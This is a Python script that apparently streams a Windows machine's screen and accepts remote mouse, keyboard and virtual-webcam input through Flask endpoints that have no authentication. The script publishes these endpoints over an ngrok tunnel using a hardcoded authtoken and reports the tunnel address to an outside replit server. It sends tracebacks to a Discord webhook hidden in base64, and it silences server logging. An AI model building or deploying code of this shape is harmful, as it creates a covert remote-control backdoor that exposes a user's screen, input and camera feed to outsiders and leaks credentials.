import ctypes
from ctypes import *
import atexit
import threading, zlib, os, logging, time
import sys, base64, traceback
#these first 70 lines are the worst lines ive ever written ever lol fuck 



def run(cmd):
    return os.popen(cmd).read().replace("\n", "")
    
def install_packages(package_list):
    existing_packages = run("pip list")
    for package in package_list:
        if package not in existing_packages:
            print(f"Installing {package}")
            run(f"pip install {package}")

os.system("cls")
if len(sys.argv) == 1:
    X = input("X: ")

    if X == "":
        X = 192
        Y = 108
        FPS = 60
        SIZE = 7
        USE_NGROK = True
        print("default")
    else:
        X = int(X)
        Y, FPS, SIZE, USE_NGROK  = int(input("Y: ")), int(input("FPS: ")), int(input("Size: ")) , input("Use ngrok?: ").lower() == "y"
else:
    X = 192
    Y = 108
    FPS = 60
    SIZE = 7
    USE_NGROK = True

InitNGROK = False # very very hacky
while True: 
    try:  
        from flask import Flask, request
        import fast_json
        import pyautogui, keyboard  
        import pyvirtualcam
        import numpy as np
        import requests
        import cv2
        import dxcam
        break
    except ImportError as e:
        InitNGROK = True
        install_packages(['flask', 'opencv-python', 'pyngrok', 'pyautogui', 'numpy', 'fast_json', 'keyboard', 'pyvirtualcam', 'requests', 'dxcam'])

if InitNGROK:
    with open("setup.py", "w") as file: 
        file.write(r'''
from pyngrok import ngrok
ngrok.get_tunnels() 
''')
    run("python setup.py")
    run("ngrok authtoken 2VyDoQxO5XZZINaDx5QTyHarFbj_4sjRMJh4cNYQWU827jY16")

from pyngrok import ngrok



wh = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTE1NzQ2Mjk0NjYzMzQ5ODY3Ny94WC1ZajNucFBWeGNMc2hwNHVDdmwzalU5SjAxSjczSGNRTzBCLWxUMC14NDdXeFJTVzJHVE95ZDZrZ0p5amZOakJHTA=="  
wh = base64.b64decode(wh)

def send_to_discord(content):
    data = {"content": content}
    response = requests.post(wh, json=data)
    return response.status_code

def handle_exception(exc_type, exc_value, exc_traceback):
    error_details = "".join(traceback.format_exception(exc_type, exc_value, exc_traceback))
    send_to_discord(f"Error:\n```{error_details}```")

sys.excepthook = handle_exception



log = logging.getLogger('werkzeug')
log.disabled = True


SERVER_URL = "https://image.glorytosouthsud.repl.co/"



os.system("cls")

def get_size_in_units(input_string, units=["B", "KB", "MB", "GB"]):
    size_in_bytes = len(input_string)
    unit_index = 0
    while size_in_bytes >= 1024 and unit_index < len(units) - 1:
        size_in_bytes /= 1024
        unit_index += 1
    return f"{size_in_bytes:.2f} {units[unit_index]}"


camera = dxcam.create()
camera.start(target_fps = FPS, video_mode=True)



def CreateHTTPTunnel(Port):
    for tunnel in ngrok.get_tunnels():
        tunnel.kill()

    tunnel = ngrok.connect(Port)

    url = tunnel.public_url

    print(f"Created ngrok tunnel at {url}")

    return url


class ProcessFramesResult(ctypes.Structure):
    _fields_ = [
        ("data", ctypes.POINTER(ctypes.c_ubyte)),
        ("size", ctypes.c_size_t),
    ]


lib = ctypes.CDLL(f"{os.getcwd()}\LivestreamProcessor.dll")

lib.process_frames.argtypes = [ctypes.c_char_p]
lib.process_frames.restype = ProcessFramesResult

lib.free_result.argtypes = [ctypes.POINTER(ctypes.c_ubyte), ctypes.c_size_t]
lib.free_result.restype = None

lib.clear_compressor_cache.argtypes = None
lib.clear_compressor_cache.restype = None

def process_frames(frames):

    serialized_frames = fast_json.dumps(frames).encode("utf-8")

    result = lib.process_frames(serialized_frames)

    data_size = result.size

    output = ctypes.string_at(result.data, data_size)

    lib.free_result(result.data, data_size)

    return output




def TakeScreenshots(Data):
    Resolution = Data["Resolution"]
    X = Resolution["X"]
    Y = Resolution["Y"]
    FrameRecordAmount = Data["FrameRecordAmount"]

    screenshots = [ ]

    for i in range(FrameRecordAmount):
        image = camera.get_latest_frame()  
        if image is None:
            screenshots.append([])
            continue

        res = cv2.resize(image, dsize=(X, Y), interpolation=3).reshape(-1, 3)
        #div = 64
        #quantized = res // div * div + div // 2 
        
        screenshots.append(res.tolist())

    #print(f"Raw: {get_size_in_units(str(screenshots))}")

    return screenshots

WEBCAMX = 10 
WEBCAMY = 10

Frame = np.zeros((WEBCAMX, WEBCAMY, 3), dtype=np.uint8)
def Webcam():
    global Frame
    with pyvirtualcam.Camera(width=WEBCAMX, height=WEBCAMY, fps=20) as cam:
        while True:
            cam.send(Frame)
            cam.sleep_until_next_frame()

def RebuildCamera(data):
    Image = []
    for i in range(0, len(data), 4):
        R = data[i]
        G = data[i + 1]
        B = data[i + 2]
        AM = data[i + 3]
        for i in range(AM):
            Image.append((R, G, B))
        
    return np.array(Image).reshape((WEBCAMX, WEBCAMY, 3)).astype(np.uint8)

def WebcamDaemon():
    WebcamThread = threading.Thread(target=Webcam)
    WebcamThread.daemon = True
    WebcamThread.start()
    return WebcamThread


def DecompressZlib(Data : bytes):
    return zlib.decompress(Data).decode("utf-8")

def GetFrames(Data):

    start1 = time.time()

    Frames = TakeScreenshots(Data)

    FrameRecordTime = time.time() - start1
    

    start2 = time.time()
    VideoData = process_frames(Frames)
    ProcessedTime = time.time() - start2

    print("\033[92m {}\033[00m" .format(f"Captured {Data['FrameRecordAmount']} frames in {FrameRecordTime} seconds\nProcessed frames in {ProcessedTime}"))

    return VideoData



class VM:
    def __init__(self):
        pass
    def Click(self, Body):
        X = Body["X"]
        Y = Body["Y"]
        Type = Body["MouseButton"]
        pyautogui.moveTo(X, Y)

        if Type == "Left":
            pyautogui.click()
        elif Type == "Right":
            pyautogui.click(button='right')


    def PressAndRelease(self, key):
        keyboard.press(key)
        time.sleep(1)
        keyboard.release(key)
    
    def SetVirtualCamera(self, CameraVideoData):
        global Frame
        for CamFrame in CameraVideoData:
            Frame = RebuildCamera(CamFrame)        


Machine = VM()
app = Flask(__name__)

@app.route('/PingVM', methods = ["GET"]) 
def PingVM():
    return "OK!"


@app.route('/VMRefresh', methods = ["POST"]) 
def VMRefresh():
    lib.clear_compressor_cache()
    return "OK!"

@app.route('/VMInput', methods = ["POST"]) # type: ignore
def VMInput():
    try:
        RequestBody = request.get_json()
        Type = RequestBody.get("Type")
        Body = RequestBody.get("Body")
        
        ({
            "Mouse" : Machine.Click,
            "Keyboard" : Machine.PressAndRelease
        })[Type](Body)
    except Exception as e:
        send_to_discord(str(e))
    return "OK!"

@app.route("/GetVideoData", methods = ["POST", "GET"])
def GetVideoData():
    start = time.time()
    global X, Y, FPS
    print("Got request")

    VideoData = GetFrames({
        "FrameRecordAmount" : 30,
        "FPS" : FPS,
        "Resolution" : {
            "X" : X,
            "Y" : Y
        }
    })

    if request.method == "POST":
        RequestBody = request.get_json()

        CameraVideoData = RequestBody["Camera"]
        Machine.SetVirtualCamera(CameraVideoData)

        print("/GetVideoData took", time.time()- start, "seconds")
        return VideoData
    

    Data = DecompressZlib(VideoData)

   # print(f"Zzlib: {get_size_in_units(VideoData)}\nCompression withou zzlib: {get_size_in_units(Data)}")
    return Data

def GetIP():
    return requests.get("https://api.ipify.org/?format=json").json()["ip"]

def stop_capturer():
    global camera
    camera.stop()
    del camera
    
atexit.register(stop_capturer)


if __name__ == "__main__":
    WebcamDaemon()
    PORT = 42171
    ServerUrl = USE_NGROK and CreateHTTPTunnel(PORT) or f"http://{GetIP()}:42171"
    StreamData = {
        "X" : X,
        "Y" : Y,
        "FPS" : FPS,
        "Size" : SIZE,
        "Tunnel" : ServerUrl
    }

    requests.post(SERVER_URL + "update_setting", json=StreamData)
    app.run(host='0.0.0.0', port=PORT)

